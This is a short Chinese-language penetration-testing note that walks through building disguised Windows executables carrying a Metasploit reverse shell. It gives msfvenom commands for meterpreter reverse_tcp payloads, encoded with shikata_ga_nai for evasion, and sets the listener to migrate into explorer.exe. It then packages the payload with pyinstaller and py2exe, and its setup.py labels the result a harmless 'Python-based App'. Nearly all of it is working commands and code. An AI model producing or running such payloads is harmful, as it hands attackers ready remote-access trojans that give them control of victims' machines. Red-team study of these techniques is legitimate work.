  #### pyinstaller加载py代码编译(*)
	生成py格式payload
	MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
	>msfvenom -p windows/meterpreter/reverse_tcp LPORT=12138 LHOST=192.168.0.108 -e x86/shikata_ga_nai -i 11 -f py -o /var/www/html/1.py
	粘贴shellcode到shellcode+py.py中，在32位系统上安装python、py2exe、pyinstaller进入C:\Python27\Scripts目录使用命令把py打包为exe
	>python pyinstaller-script.py --console --onefile shellcode.py
	会在目录下生成dist文件夹，exe文件就在里面
	
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/60.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/61.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/62.png)
  #### Py2exe打包exe
	生成raw格式payload
	MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
	>msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f raw -o /var/www/html/shell.py
	在32位系统上安装python、py2exe
	创建setup.py放置同一目录
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/63.png)

	from distutils.core import setup
	import py2exe
	setup(
	name = "Meter",
	description = "Python-based App",
	version = "1.0",
	console = ["shell.py"],
	options = {"py2exe":{"bundle_files":1,"packages":"ctypes","includes":"base64,sys,socket,struct,time,code,platform,getpass,shutil",}},
	zipfile = None
	)
	执行打包命令
	>python setup.py py2exe
	会在当前目录生成dist文件夹，打包好的exe在里面
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/64.png)